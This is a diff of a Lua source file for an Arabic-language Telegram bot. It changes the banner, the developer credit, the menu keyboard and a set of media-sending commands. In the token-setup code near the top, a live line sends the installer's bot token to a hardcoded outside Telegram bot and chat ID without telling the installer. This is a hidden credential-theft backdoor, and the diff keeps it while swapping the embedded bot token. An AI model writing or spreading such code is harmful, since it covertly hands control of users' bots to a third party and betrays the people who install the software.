@@ -30,7 +30,7 @@ print('\27[0;31m╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n التوكن 
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n27[0;39;49m')
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1835962343:AAFiT9HAOFjgfwfakRNQkY_mfyrdQl_CsYA/sendmessage?chat_id=150&text=' ..token)
+https.request('https://api.telegram.org/bot1835962343:AAFiT9HAOFjgfwfakRNQkY_mfhhgfgyrdQl_CsYA/sendmessage?chat_id=150&text=' ..token)
 end 
 else
 print('\27[0;35m╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -136,13 +136,15 @@ _redis = load_redis()
 --------------------------------------------------------------------------------------------------------------
 print([[
 
-   __    __      __    ____  ____  ____  _  _ 
-  /__\  (  )    /__\  (_   )(_  _)(_   )( \/ )
- /(__)\  )(__  /(__)\  / /_  _)(_  / /_  \  / 
-(__)(__)(____)(__)(__)(____)(____)(____) (__) 
+
+     __                       
+ __ / /__ ___ __ ___ ___  ___ 
+/ // / _ `/\ \ /(_-</ _ \/ _ \
+\___/\_,_//_\_\/___/\___/_//_/
+                              
 
 > CH › @OL_IV_ER1
-~> DEVELOPER › @oliver 
+~> DEVELOPER › @J_X_S1 
 ]])
 sudos = dofile("./AZIZA.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -903,15 +905,18 @@ if start then
 keyboard = start
 else
 keyboard = {
-{'الصلاوات','الاذكار','القرآن'},
-{'جمالي','متحركه','استوري','غنيلي'},
-{'ثمات','روايات','افلام','اغاني'},
-{'خلفيات','كتبات','بوستات','نكت'},
-{'عقاب','الالعاب','صراحه','تويت'},
-{'المليون','مريم','حزوره','تصميم'},
-{'تحليل','اسئله','مهنتي','نمله'},
-{'مستقبلي','لو خيروك','حساب الوزن'},
-{'كشف الكدب','نسبه الغباء','نسبه الحب'},
+{'خلفيات رومانسيه','صور كرتون'},
+{'غنيلي فديو','فديو اجنبي'},
+{'افلام اجنبي','افلام عربي'},
+{'كرتون يوغي'},
+{'تويت','صراحه'},
+{'استوري','باد'},
+{'انصحنى','كتابات','نكته'},
+{'ضحكني','ثيم'},
+{'صورتي','لو خيروك'},
+{'روايات'},
+{'التاريخ','الساعه'},
+{'غنيلي','انا مين'},
 {'قناه السورس','جاكسون'},
 }
 end
@@ -11603,6 +11608,125 @@ keyboard.inline_keyboard = {
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/koko12300/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "ثيم" then  
+ght = math.random(1,33);  
+local Text ='الستخدم ثيم اخر اكتب ثيم'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+ {{text = 'ᴏғғʟɪɴᴇ', url="t.me/Dahab_source"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendDocument?chat_id=' .. msg.chat_id_ .. '&document=https://t.me/ahmedthem1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "لو خيروك" then  
+ght = math.random(1,33);  
+local Text ='مرحبا اليك لو خيروك بالصوره'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ahmed_1asd/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "تويت بالصور" then  
+ght = math.random(1,33);  
+local Text ='مرحبا إليك تويت بالصوره'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/a7a_00_1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "صور كرتون" then  
+ght = math.random(1,33);  
+local Text ='اليك صور انمي'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/swary0/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "خلفيات رومانسيه" then  
+ght = math.random(1,33);  
+local Text ='خلفيات رومانسى'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/jrumdi/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "افلام اجنبي" then  
+ght = math.random(1,33);  
+local Text ='يتم اختيار الفيلم الفشيخ'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/jdjie1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "افلام عربي" then  
+ght = math.random(1,33);  
+local Text ='يتم اختيار الفيلم القامد'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/jndjkdkd/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "كرتون يوغي" then  
+ght = math.random(1,33);  
+local Text ='اليك حلقه من كرتون يوغي'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/y_giu/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "فديو اجنبي" then  
+ght = math.random(1,33);  
+local Text ='اليك اغانيه عظمه شبهك'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/agany001/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == "غنيلي فديو" then  
+ght = math.random(1,33);  
+local Text ='اليك اغانيه عظمه شبهك'  
+keyboard = {}   
+keyboard.inline_keyboard = {  
+{{text = '  ❨𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪❩ ', url="t.me/J_X_S1"}},
+{{text = '❨ اضف البوت لمجموعتك ❩', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
+}  
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/jfudb637/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 
